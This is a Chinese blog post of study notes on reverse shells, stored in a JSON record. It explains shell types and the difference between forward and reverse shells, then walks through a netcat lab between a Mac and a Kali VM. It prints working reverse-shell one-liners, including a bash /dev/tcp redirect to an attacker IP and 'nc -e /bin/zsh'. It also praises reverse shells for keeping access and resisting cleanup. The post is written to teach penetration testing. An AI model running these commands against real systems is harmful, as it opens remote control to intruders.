{"title":"反弹shell命令学习笔记","uid":"e54765d52f8094054e22b090d91f01da","slug":"反弹shell","date":"2022-03-15T09:20:06.000Z","updated":"2022-03-15T13:15:37.893Z","comments":true,"path":"api/articles/反弹shell.json","keywords":null,"cover":[],"content":"<p><a href=\"%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95\">文章目录</a></p>\n<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p><code>   为何给靶机发送这条执行命令就会自动连接到本地计算机,并且出发实时通讯机制(ps:有点类似oicq,前生就是用的这种模式开发的即时通讯)</code></p>\n<p><code>   作为渗透测试人员必备技能,反弹shell到底是什么原理,以及如何使用,本文是自己学习shell命令时的个人感悟和笔记,文章内容大量引入了较为官方的语言,给入门渗透学习的人员提供一个参考</code><a href=\"https://blog.csdn.net/qq_37092496/article/details/122931617\">^1</a></p>\n<hr>\n<p><strong>常用的反弹shell命令:<br>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;vps的ip&#x2F;vps的端口 0&gt;&amp;1</strong>    </p>\n<h1 id=\"何为shell\"><a href=\"#何为shell\" class=\"headerlink\" title=\"何为shell\"></a>何为shell</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>Shell 脚本（shell script），是一种为 shell 编写的脚本程序。</p></blockquote>\n<h1 id=\"如何执行\"><a href=\"#如何执行\" class=\"headerlink\" title=\"如何执行\"></a>如何执行</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>有一个能编写代码的文本编辑器和一个能解释执行的脚本解释器就可以执行</p></blockquote>\n<h1 id=\"shell种类\"><a href=\"#shell种类\" class=\"headerlink\" title=\"shell种类\"></a>shell种类</h1><h2 id=\"linux\"><a href=\"#linux\" class=\"headerlink\" title=\"linux\"></a>linux</h2><pre class=\"line-numbers language-ruby\" data-language=\"ruby\"><code class=\"language-ruby\">Bourne Shell（<span class=\"token operator\">/</span>usr<span class=\"token operator\">/</span>bin<span class=\"token operator\">/</span>sh或<span class=\"token operator\">/</span>bin<span class=\"token operator\">/</span>sh）\nBourne Again Shell（<span class=\"token operator\">/</span>bin<span class=\"token operator\">/</span>bash）\n<span class=\"token constant\">C</span> Shell（<span class=\"token operator\">/</span>usr<span class=\"token operator\">/</span>bin<span class=\"token operator\">/</span>csh）\n<span class=\"token constant\">K</span> Shell（<span class=\"token operator\">/</span>usr<span class=\"token operator\">/</span>bin<span class=\"token operator\">/</span>ksh）\nShell <span class=\"token keyword\">for</span> Root（<span class=\"token operator\">/</span>sbin<span class=\"token operator\">/</span>sh）<span class=\"token operator\">..</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"Mac\"><a href=\"#Mac\" class=\"headerlink\" title=\"Mac\"></a>Mac</h2><pre class=\"line-numbers language-zsh\" data-language=\"zsh\"><code class=\"language-zsh\">bash\nzsh\n..<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"Windows\"><a href=\"#Windows\" class=\"headerlink\" title=\"Windows\"></a>Windows</h2><pre class=\"line-numbers language-zsh\" data-language=\"zsh\"><code class=\"language-zsh\">PowerShell\nCmd\n..<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"bash与sh\"><a href=\"#bash与sh\" class=\"headerlink\" title=\"bash与sh\"></a>bash与sh</h2><p>bash对sh兼容，是各种Linux发行版标准配置的Shell</p>\n<h2 id=\"何为反弹shell\"><a href=\"#何为反弹shell\" class=\"headerlink\" title=\"何为反弹shell:\"></a>何为反弹shell:</h2><div class=\"custom-quote tip\">\n<span class=\"custom-quote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M20.86 14.13C20 14.7 19.56 15.74 19.77 16.76C20.13 18.55 18.55 20.13 16.76 19.77C15.74 19.57 14.7 20 14.13 20.86C13.12 22.38 10.89 22.38 9.88 20.86C9.3 20 8.26 19.56 7.24 19.77C5.45 20.13 3.87 18.55 4.23 16.76C4.43 15.74 4 14.7 3.14 14.13C1.62 13.12 1.62 10.89 3.14 9.88C4 9.3 4.44 8.26 4.23 7.24C3.87 5.45 5.45 3.87 7.24 4.23C8.26 4.44 9.3 4 9.87 3.14C10.88 1.62 13.11 1.62 14.12 3.14C14.7 4 15.74 4.44 16.76 4.23C18.55 3.87 20.13 5.45 19.77 7.24C19.56 8.26 20 9.3 20.86 9.87C22.38 10.88 22.38 13.12 20.86 14.13Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M12.01 15C12.01 14.5 12.01 14.5 12.01 14.5C12.04 13.75 13 13.46 14.04 12.2C14.41 11.74 14.69 11.41 14.86 10.85C15.15 9.95 14.92 9.18 14.86 9.02C14.8 8.79 14.52 8 13.72 7.46C13.06 7.02 12.42 7 12.14 7C11.9 7 11.36 7 10.78 7.3C10.28 7.56 9.98 7.9 9.83 8.1C9.24 8.82 9.06 9.63 9 10.06\"></path>\n<path stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M11.99 18H12.01\"></path>\n</svg></span>\n<p class=\"custom-quote-title\">让靶机主动执行连接我们本地机器的命令</p>\n<p>优点:</p>\n<ul>\n<li>靶机更换ip后依然不会丢失权限</li>\n<li>连接方便、操作简单</li>\n<li>相较于传统后门不易被清理等优势;</li>\n</ul>\n\n</div>\n<h3 id=\"正向shell\"><a href=\"#正向shell\" class=\"headerlink\" title=\"正向shell\"></a>正向shell</h3><p>可以理解为q1给q2打电话,q2接电话,完成信息接通</p>\n<h3 id=\"反弹shell\"><a href=\"#反弹shell\" class=\"headerlink\" title=\"反弹shell\"></a>反弹shell</h3><p>可以理解为q1给q2打电话,q2把q1的电话号码保存下来,然后重新呼叫了q1</p>\n<h1 id=\"linux反弹shell\"><a href=\"#linux反弹shell\" class=\"headerlink\" title=\"linux反弹shell\"></a>linux反弹shell</h1><h2 id=\"nc-NetCat\"><a href=\"#nc-NetCat\" class=\"headerlink\" title=\"nc(NetCat)\"></a>nc(NetCat)</h2><p>可实现任意TCP&#x2F;UDP端口的侦听</p>\n<h3 id=\"安装nc-发行版linux默认已安装\"><a href=\"#安装nc-发行版linux默认已安装\" class=\"headerlink\" title=\"安装nc(发行版linux默认已安装)\"></a>安装nc(发行版linux默认已安装)</h3><p><strong>命令：</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">yum install nc -y<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"使用方法\"><a href=\"#使用方法\" class=\"headerlink\" title=\"使用方法\"></a>使用方法</h3><pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\">nc -lvp 4444 \n# -lvp (l监听v输出p端口)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<h1 id=\"实战\"><a href=\"#实战\" class=\"headerlink\" title=\"实战\"></a>实战</h1><p>靶机执行:</p>\n<pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.0.10&#x2F;4444 0&gt;&amp;1\n# bash -i  启动交互式命令bash \n# -i       将输出重定向到文件\n# &#x2F;dev&#x2F;tcp 靶机为Linux的设备&#x2F;dev&#x2F;tcp连接程序启动socket(Linux系统:所有程序都是目录文件)\n# 192.168.0.10&#x2F;4444 连接的ip和端口(即本地计算机)\n# 0&gt;&amp;1     远程的输入和输出(消息呈现方式为远程)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<table>\n<thead>\n<tr>\n<th>命令</th>\n<th>解释</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>bash -i</td>\n<td>启动交互式命令bash</td>\n</tr>\n<tr>\n<td>-i</td>\n<td>将输出重定向到文件</td>\n</tr>\n<tr>\n<td>&#x2F;dev&#x2F;tcp</td>\n<td>靶机为Linux的设备&#x2F;dev&#x2F;tcp连接程序启动socket(Linux系统:所有程序都是目录文件)</td>\n</tr>\n<tr>\n<td>192.168.0.10&#x2F;4444</td>\n<td>连接的ip和端口(即本地计算机)</td>\n</tr>\n<tr>\n<td>0&gt;&amp;1</td>\n<td>远程的输入和输出(消息呈现方式为远程)</td>\n</tr>\n</tbody></table>\n<h3 id=\"实战时注意\"><a href=\"#实战时注意\" class=\"headerlink\" title=\"实战时注意\"></a>实战时注意</h3><div class=\"custom-quote warning\">\n<span class=\"custom-quote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M20.86 14.13C20 14.7 19.56 15.74 19.77 16.76C20.13 18.55 18.55 20.13 16.76 19.77C15.74 19.57 14.7 20 14.13 20.86C13.12 22.38 10.89 22.38 9.88 20.86C9.3 20 8.26 19.56 7.24 19.77C5.45 20.13 3.87 18.55 4.23 16.76C4.43 15.74 4 14.7 3.14 14.13C1.62 13.12 1.62 10.89 3.14 9.88C4 9.3 4.44 8.26 4.23 7.24C3.87 5.45 5.45 3.87 7.24 4.23C8.26 4.44 9.3 4 9.87 3.14C10.88 1.62 13.11 1.62 14.12 3.14C14.7 4 15.74 4.44 16.76 4.23C18.55 3.87 20.13 5.45 19.77 7.24C19.56 8.26 20 9.3 20.86 9.87C22.38 10.88 22.38 13.12 20.86 14.13Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M12 8V13\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M12 15.99V16.01\"></path>\n</svg>\n</span>\n<p class=\"custom-quote-title\">注意</p>\n<p>Mac监听端没有<del>nc -lvp port</del>此命令   只有nc -lv port</p>\n</div>\n<h3 id=\"实战中-我拿Mac和kali-linux进行测试\"><a href=\"#实战中-我拿Mac和kali-linux进行测试\" class=\"headerlink\" title=\"实战中,我拿Mac和kali-linux进行测试\"></a>实战中,我拿Mac和kali-linux进行测试</h3><p>查看Mac和Linux的ip命令:</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">sudo</span> <span class=\"token function\">su</span>\n<span class=\"token function\">ifconfig</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>kali的ip:10.211.55.4</p>\n<p><img src=\"%E5%8F%8D%E5%BC%B9shell/16473386909099.jpg\"></p>\n<p>Mac的ip:10.37.129.2</p>\n<p><img src=\"%E5%8F%8D%E5%BC%B9shell/16473387396460.jpg\"></p>\n<p><strong>正向连接</strong>- Mac连接kali</p>\n<p>1.kali启动监听:(先启动监听,否则拒绝连接)</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">sudo</span> <span class=\"token function\">su</span>\n<span class=\"token function\">nc</span> -lv <span class=\"token number\">7777</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p><img src=\"%E5%8F%8D%E5%BC%B9shell/16473394017726.jpg\" alt=\"kali已启动监听\"></p>\n<p>Mac执行:</p>\n<pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\"><span class=\"token function\">sudo</span> <span class=\"token function\">su</span>\n<span class=\"token function\">zsh</span> -i <span class=\"token operator\">></span> /dev/tcp/mac监听ip/mac监听端口\n<span class=\"token punctuation\">(</span>ls,pwd,whoami,cd /tmp,<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"%E5%8F%8D%E5%BC%B9shell/16473394831556.jpg\"></p>\n<p>此时Mac终端执行者已经变为kali的root用户</p>\n<p><strong>尝试发送信息</strong>(Mac-&gt;kali)</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">whoami</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"%E5%8F%8D%E5%BC%B9shell/16473395838417.jpg\"></p>\n<p>kali机:监听端口并且实时回显信息</p>\n<p><img src=\"%E5%8F%8D%E5%BC%B9shell/16473396507706.jpg\"></p>\n<p><strong>尝试在kali上执行命令</strong></p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token builtin class-name\">pwd</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"%E5%8F%8D%E5%BC%B9shell/16473397131900.jpg\"></p>\n<p><img src=\"%E5%8F%8D%E5%BC%B9shell/16473397508055.jpg\"></p>\n<p>可以看到Mac上并无信息</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>因为此时为单方通信,即Mac的信息呈现在kali</p></blockquote>\n<h1 id=\"反弹shell-1\"><a href=\"#反弹shell-1\" class=\"headerlink\" title=\"反弹shell\"></a>反弹shell</h1><p><strong>shell:Mac-&gt;(攻击)kali</strong></p>\n<p><strong>Mac开启监听</strong></p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">nc</span> -lv <span class=\"token number\">7777</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"%E5%8F%8D%E5%BC%B9shell/16473409354588.jpg\" alt=\"Mac开启监听\"></p>\n<p><strong>kali开启shell</strong></p>\n<pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\"><span class=\"token function\">nc</span> <span class=\"token number\">10.211</span>.55.2<span class=\"token punctuation\">(</span>Mac:ip<span class=\"token punctuation\">)</span> <span class=\"token number\">7777</span> -e /bin/zsh<span class=\"token punctuation\">(</span>zsh或者bash<span class=\"token punctuation\">)</span> \n```<span class=\"token variable\"><span class=\"token variable\">`</span>\n<span class=\"token operator\">></span>ps:模拟渗透测试时通过某个途径将shell命令发送到了kali机器并成功执行\n\n<span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span>反弹shell/16473411207387.jpg<span class=\"token punctuation\">)</span>\n\n此时在Mac<span class=\"token punctuation\">(</span>攻击机<span class=\"token punctuation\">)</span>上执行命令:\n<span class=\"token variable\">`</span></span>``shell\n<span class=\"token function\">whoami</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"%E5%8F%8D%E5%BC%B9shell/16473414453104.jpg\" alt=\"Mac(攻击机)上执行命令\"></p>\n<p>可以看到Mac机成功执行命令,并且反弹回相关信息</p>\n<p>再看看kali机<br><img src=\"%E5%8F%8D%E5%BC%B9shell/16473415662994.jpg\"></p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>并无任何显示</p></blockquote>\n<p><strong>反弹shell:linux——&gt;(攻击)kali</strong><br>kali开启监听</p>\n<pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\"><span class=\"token function\">nc</span> -lvnp <span class=\"token number\">7777</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"%E5%8F%8D%E5%BC%B9shell/16473420889549.jpg\" alt=\"kali开启监听\"></p>\n<p>Mac被攻击,执行了shell命令:</p>\n<pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\"><span class=\"token function\">bash</span> -i <span class=\"token operator\">>&amp;</span> /dev/tcp/10.211.55.4<span class=\"token punctuation\">(</span>kali<span class=\"token punctuation\">)</span>/7777 <span class=\"token operator\"><span class=\"token file-descriptor important\">0</span>></span><span class=\"token file-descriptor important\">&amp;1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"%E5%8F%8D%E5%BC%B9shell/16473422893670.jpg\" alt=\"mac\"><br>此时kali已经有回显信息了,并且连接成功为bash<br><img src=\"%E5%8F%8D%E5%BC%B9shell/16473422176451.jpg\"></p>\n<p><strong>在kali上执行命令,成功回显</strong></p>\n<p><img src=\"%E5%8F%8D%E5%BC%B9shell/16473424311825.jpg\" alt=\"kali\"></p>\n<p>Mac不能执行主动终结命令,权限属于kali机</p>\n<p>以上就是我对反弹shell的理解和感受,欢迎留言<br><strong>写作耗时约2h@(｡･o･)@</strong></p>\n<h6 id=\"阅读更多-๑•̀ㅂ•́-و✧Fighting\"><a href=\"#阅读更多-๑•̀ㅂ•́-و✧Fighting\" class=\"headerlink\" title=\"阅读更多(๑•̀ㅂ•́)و✧Fighting\"></a>阅读更多(๑•̀ㅂ•́)و✧Fighting</h6><!-- comment -->\n<span id=\"more\"></span>\n\n","feature":true,"text":"文章目录 前言 为何给靶机发送这条执行命令就会自动连接到本地计算机,并且出发实时通讯机制(ps:有点类似oicq,前生就是用的这种模式开发的即时通讯) 作为渗透测试人员必备技能,反弹shell到底是什么原理,以及如何使用,本文是自己学习shell命令时的个人感悟和笔记,文章内容大...","link":"","photos":[],"count_time":{"symbolsCount":"2.4k","symbolsTime":"2 mins."},"categories":[{"name":"技术","slug":"技术","count":3,"path":"api/categories/技术.json"}],"tags":[{"name":"学习笔记","slug":"学习笔记","count":4,"path":"api/tags/学习笔记.json"},{"name":"Mac","slug":"Mac","count":2,"path":"api/tags/Mac.json"},{"name":"shell","slug":"shell","count":1,"path":"api/tags/shell.json"},{"name":"kali-Linux","slug":"kali-Linux","count":1,"path":"api/tags/kali-Linux.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%89%8D%E8%A8%80\"><span class=\"toc-text\">前言</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E4%BD%95%E4%B8%BAshell\"><span class=\"toc-text\">何为shell</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%A6%82%E4%BD%95%E6%89%A7%E8%A1%8C\"><span class=\"toc-text\">如何执行</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#shell%E7%A7%8D%E7%B1%BB\"><span class=\"toc-text\">shell种类</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#linux\"><span class=\"toc-text\">linux</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Mac\"><span class=\"toc-text\">Mac</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Windows\"><span class=\"toc-text\">Windows</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#bash%E4%B8%8Esh\"><span class=\"toc-text\">bash与sh</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BD%95%E4%B8%BA%E5%8F%8D%E5%BC%B9shell\"><span class=\"toc-text\">何为反弹shell:</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%AD%A3%E5%90%91shell\"><span class=\"toc-text\">正向shell</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%8F%8D%E5%BC%B9shell\"><span class=\"toc-text\">反弹shell</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#linux%E5%8F%8D%E5%BC%B9shell\"><span class=\"toc-text\">linux反弹shell</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#nc-NetCat\"><span class=\"toc-text\">nc(NetCat)</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%AE%89%E8%A3%85nc-%E5%8F%91%E8%A1%8C%E7%89%88linux%E9%BB%98%E8%AE%A4%E5%B7%B2%E5%AE%89%E8%A3%85\"><span class=\"toc-text\">安装nc(发行版linux默认已安装)</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">使用方法</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%AE%9E%E6%88%98\"><span class=\"toc-text\">实战</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" 